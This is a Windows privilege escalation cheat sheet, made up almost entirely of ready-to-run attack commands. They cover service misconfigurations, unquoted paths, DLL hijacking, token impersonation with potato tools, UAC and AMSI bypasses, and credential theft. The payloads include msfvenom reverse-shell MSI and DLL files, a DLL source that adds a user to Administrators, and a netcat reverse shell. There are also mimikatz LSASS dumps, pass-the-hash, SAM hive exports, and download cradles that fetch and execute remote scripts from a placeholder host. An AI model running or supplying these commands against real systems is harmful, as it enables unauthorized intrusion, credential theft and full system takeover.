# Services and Tokens

Windows privilege escalation commands for service permissions, unquoted paths, DLL hijacking, tokens, UAC, installer policies and credentials.

**What is Windows Privilege Escalation?**

Windows privilege escalation depends on the current token and the permissions attached to services, files, registry keys and tasks. A suspicious service path or privilege name is a lead; exploitation also requires the matching write access, token state or service behavior.

PowerShell and native Windows commands inspect the current machine. Replace service and directory placeholders before checking the associated ACLs.

System info, current user privileges, and admin group membership

```
systeminfo
whoami /all
net user %username%
net localgroup administrators
```

Enumerate services — look for unquoted paths and weak permissions

```
wmic service get name,displayname,pathname,startmode
sc qc <service_name>
```

List scheduled tasks with run-as user context

```
schtasks /query /fo LIST /v | findstr /i "task name\|run as\|status"
```

Enumerate autorun registry keys

```
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
```

Search registry for password strings

```
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s
```

Installed software — check for vulnerable versions

```
wmic product get name,version,vendor | sort
```

Network configuration — find internal hosts for lateral movement

```
ipconfig /all && route print && arp -a
```

Listening ports — check for internal services

```
netstat -ano | findstr LISTENING
```

Search filesystem for credential files

```
findstr /si password *.txt *.xml *.config 2>nul
dir /s /b *pass* *cred* *vnc* *.config 2>nul
```

PowerShell credential file search

```
PowerShell: Get-ChildItem -Path C:\ -Include *.txt,*.xml,*.config -Recurse -ErrorAction SilentlyContinue | Select-String -Pattern "password|passwd|credential" 2>$null
```

Find directories writable by Authenticated Users / Everyone (Sysinternals accesschk)

```
accesschk.exe -uwdqs "Authenticated Users" C:\ 2>nul
accesschk.exe -uwdqs "Everyone" C:\ 2>nul
```

Check if AlwaysInstallElevated is enabled (both HKCU and HKLM must be 1)

```
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
# Both must be 0x1 for exploitation
```

Generate and install malicious MSI with SYSTEM privileges

```
# Generate malicious MSI (Linux/Windows):
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=4444 -f msi -o evil.msi

# Or craft MSI with msiexec:
msiexec /quiet /qn /i evil.msi
```

Download and execute MSI via PowerShell

```
# PowerShell PrivEsc via AlwaysInstallElevated:
$msi = "C:\Windows\Temp\evil.msi"
Invoke-WebRequest -Uri "http://<IP>/evil.msi" -OutFile $msi
Start-Process msiexec.exe -ArgumentList "/quiet /qn /i $msi" -Wait
```

Find unquoted service paths with spaces — each space is a potential insertion point

```
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "C:\Windows\\" | findstr /i /v """

# Look for paths like:
# C:\Program Files\Vulnerable App\service.exe
# → Try: C:\Program.exe, C:\Program Files\Vulnerable.exe
```

Exploit unquoted service path by placing binary at first space-split location

```
# If C:\Program Files\Vulnerable App\service.exe is unquoted:
# Windows tries: C:\Program.exe, C:\Program Files\Vulnerable.exe, then full path
# Place malicious binary at first writable location:
copy evil.exe "C:\Program Files\Vulnerable.exe"
sc stop VulnerableService
sc start VulnerableService
```

PowerShell method to enumerate unquoted auto-start services

```
# PowerShell one-liner to find unquoted service paths:
Get-WmiObject -Class win32_service | Where-Object {$_.PathName -notmatch '"' -and $_.PathName -match ' ' -and $_.StartMode -eq "Auto"} | Select Name, PathName
```

Find services that current user can reconfigure

```
# Check service permissions with accesschk:
accesschk.exe -uwcqv "Authenticated Users" *
accesschk.exe -uwcqv <username> *
# Look for: SERVICE_ALL_ACCESS, SERVICE_CHANGE_CONFIG
```

Change service binary path to malicious command or executable

```
# If SERVICE_CHANGE_CONFIG on a service:
sc config <ServiceName> binpath= "cmd.exe /k net localgroup Administrators <username> /add"
sc stop <ServiceName>
sc start <ServiceName>
# Or:
sc config <ServiceName> binpath= "C:\Temp\evil.exe"
```

Check if service binary file is writable — replace with malicious binary

```
# Check service binary file permissions:
icacls "C:\path\to\service.exe"
# If (F) or (M) for current user or group → replace binary
```

Modify service ImagePath in registry if registry key is writable

```
# Weak registry permissions on service:
accesschk.exe -uvwck HKLM\SYSTEM\CurrentControlSet\Services\<ServiceName>
# If writable → modify ImagePath registry key
```

Windows DLL search order — place malicious DLL at highest-priority writable location

```
# Windows DLL search order:
# 1. Application directory
# 2. System directory (C:\Windows\System32)
# 3. Windows directory (C:\Windows)
# 4. Current directory
# 5. PATH directories

# Find missing DLLs with Procmon (filter: NAME NOT FOUND + .dll)
```

DLL template that adds user to administrators group on load

```
# Malicious DLL template (C):
#include <windows.h>
BOOL APIENTRY DllMain(HMODULE hModule, DWORD reason, LPVOID lpReserved) {
    if (reason == DLL_PROCESS_ATTACH) {
        system("net localgroup Administrators <username> /add");
    }
    return TRUE;
}

# Compile: x86_64-w64-mingw32-gcc -shared -o evil.dll evil.c
```

Generate reverse shell DLL payload with msfvenom

```
# Using msfvenom:
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=4444 -f dll -o evil.dll
```

Find writable directories in PATH for DLL planting

```
# Check PATH directories for writable locations:
echo %PATH%
icacls "C:\some\path\in\PATH"
# If writable and a service loads a DLL by name → place malicious DLL there
```

Check for SeImpersonatePrivilege — common in web service contexts

```
# Check current privileges:
whoami /priv
# Look for: SeImpersonatePrivilege, SeAssignPrimaryTokenPrivilege
# Both are Enabled by default for IIS AppPool, SQL Server, network services
```

PrintSpoofer — SeImpersonatePrivilege escalation on modern Windows

```
# PrintSpoofer (Windows 10 / Server 2019):
.\PrintSpoofer.exe -i -c cmd
# Or spawn reverse shell:
.\PrintSpoofer.exe -c "C:\Temp\nc.exe <IP> 4444 -e cmd"
```

RoguePotato — SeImpersonatePrivilege escalation, newer potato variant

```
# RoguePotato (Windows Server 2019+, Win10):
.\RoguePotato.exe -r <IP> -e "cmd.exe" -l 9999
```

GodPotato — broadest OS support, ImpersonatePrivilege to SYSTEM

```
# GodPotato (works on Windows Server 2012 → 2022, Win8 → Win11):
.\GodPotato.exe -cmd "cmd /c whoami"
```

JuicyPotato — original potato, requires CLSID for target OS

```
# JuicyPotato (Windows Server 2016 and earlier, Win10 < 1809):
.\JuicyPotato.exe -l 1337 -p c:\windows\system32\cmd.exe -a "/c whoami" -t * -c {clsid}
# CLSID varies by OS — use https://github.com/ohpe/juicy-potato/tree/master/CLSID
```

Enumerate UAC configuration level

```
# Check UAC level:
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System
# ConsentPromptBehaviorAdmin = 5 → UAC enabled
# EnableLUA = 1 → mandatory UAC
```

fodhelper.exe UAC bypass — auto-elevated binary that reads HKCU registry

```
# fodhelper.exe bypass (Windows 10):
reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /d "cmd.exe" /f
reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /v "DelegateExecute" /f
fodhelper.exe
# Cleanup:
reg delete HKCU\Software\Classes\ms-settings /f
```

eventvwr.exe UAC bypass via HKCU hijacking

```
# eventvwr.exe bypass (Windows 7-10):
reg add HKCU\Software\Classes\mscfile\shell\open\command /d "cmd.exe" /f
reg add HKCU\Software\Classes\mscfile\shell\open\command /v "DelegateExecute" /f
eventvwr.exe
reg delete HKCU\Software\Classes\mscfile /f
```

sdclt.exe UAC bypass via App Paths hijacking

```
# sdclt.exe bypass (Windows 10):
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\App Paths\control.exe /d "cmd.exe" /f
sdclt.exe
reg delete HKCU\Software\Microsoft\Windows\CurrentVersion\App Paths\control.exe /f
```

UACME automated UAC bypass — 70+ techniques, method 41 for modern Windows

```
# UACME — automated bypass tool:
# https://github.com/hfiref0x/UACME
# 70+ methods, use method 41 (ICMLuaUtil) on Win10/11:
Akagi.exe 41 C:\Temp\reverse.exe
```

Dump SAM/SYSTEM hive for offline hash extraction

```
# SAM/SYSTEM dump (requires SYSTEM or admin):
reg save HKLM\SAM C:\Temp\SAM
reg save HKLM\SYSTEM C:\Temp\SYSTEM
reg save HKLM\SECURITY C:\Temp\SECURITY
# Exfil and extract offline:
python3 impacket-secretsdump -sam SAM -system SYSTEM -security SECURITY LOCAL
```

Dump LSASS for credential extraction — mimikatz or comsvcs.dll LOLBIN

```
# LSASS dump with Task Manager:
# Task Manager → Details → lsass.exe → Create dump file
# Or with mimikatz:
.\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit
# Or with comsvcs.dll (LOLBIN):
runas /noprofile /user:administrator "cmd /c rundll32.exe comsvcs.dll, MiniDump (Get-Process lsass).id C:\Temp\lsass.dmp full"
```

mimikatz Pass-the-Hash — spawn cmd.exe with another user NTLM hash

```
# Mimikatz pass-the-hash:
.\mimikatz.exe "sekurlsa::pth /user:Administrator /domain:. /ntlm:<NTLM_HASH> /run:cmd.exe" exit
```

Windows Credential Manager — list and dump stored credentials

```
# Windows Credential Manager:
cmdkey /list
vaultcmd /listcreds:"Windows Credentials"

# Dump with mimikatz:
.\mimikatz.exe "vault::cred /patch" exit
```

Find cleartext credentials in Windows deployment files

```
# Search for unattend.xml, sysprep.inf credentials:
dir /s /b C:\*.xml C:\*.ini 2>nul | findstr /i "unattend sysprep"
findstr /si password C:\Windows\Panther\unattend.xml
findstr /si password C:\Windows\system32\sysprep.inf
```

Locate Chrome credential database for offline extraction

```
# Browser credential extraction (Chrome):
PowerShell: Get-ChildItem -Path "C:\Users\*\AppData\Local\Google\Chrome\User Data\Default\Login Data" -ErrorAction SilentlyContinue
```

PowerShell execution policy bypass flags

```
# Execution policy bypass:
powershell -ExecutionPolicy Bypass -File script.ps1
powershell -ep bypass -enc <base64>
PowerShell.exe -nop -noni -w hidden -c "IEX (iwr http://<IP>/payload.ps1)"
```

Classic AMSI bypass — set amsiInitFailed to true

```
# AMSI bypass (patching amsiScanBuffer in current process):
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')|
  .GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```

AMSI memory context corruption bypass

```
# AMSI bypass via memory patching (2023+):
$a=[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
$b=$a.GetField('amsiContext',[Reflection.BindingFlags]'NonPublic,Static')
$c=$b.GetValue($null)
[Runtime.InteropServices.Marshal]::WriteInt32([IntPtr]$c.ToInt64(),0x41414141)
```

Check CLM mode and downgrade to PowerShell 2.0 to bypass restrictions

```
# Constrained Language Mode check and bypass:
$ExecutionContext.SessionState.LanguageMode
# FullLanguage = normal; ConstrainedLanguage = restricted
# Bypass: use PowerShell 2.0 (no AMSI/CLM):
powershell -version 2 -c "whoami"
```

PowerShell and LOLBIN download cradles for file retrieval

```
# Download cradle variants:
IEX(New-Object Net.WebClient).DownloadString("http://<IP>/ps.ps1")
IEX(Invoke-RestMethod "http://<IP>/ps.ps1")
(New-Object Net.WebClient).DownloadFile("http://<IP>/file.exe","C:\Temp\file.exe")
certutil -urlcache -split -f "http://<IP>/file.exe" file.exe
bitsadmin /transfer job /download /priority normal "http://<IP>/file.exe" "C:\Temp\file.exe"
```